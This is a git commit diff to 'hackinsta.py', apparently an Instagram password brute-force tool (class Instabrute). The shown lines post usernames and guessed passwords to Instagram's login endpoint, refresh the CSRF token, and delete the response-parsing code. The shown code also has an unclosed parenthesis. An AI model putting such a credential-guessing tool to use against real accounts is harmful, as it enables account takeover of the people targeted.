dd733009908079d32e1f7db131e1897d200e4b9d
tanishk1428 <63748933+tanishk1428@users.noreply.github.com>
2020-04-17 02:14:26 +0530

    Update hackinsta.py

--- hackinsta.py
+++ hackinsta.py
@@ -100,8 +100,7 @@ class Instabrute():
 		#Update token after login to the site
 		r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username':self.username, 'password':password}, allow_redirects=True)
 		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']}
-		#parse response
-		data = json.loads(r.text)
+
 
 
 
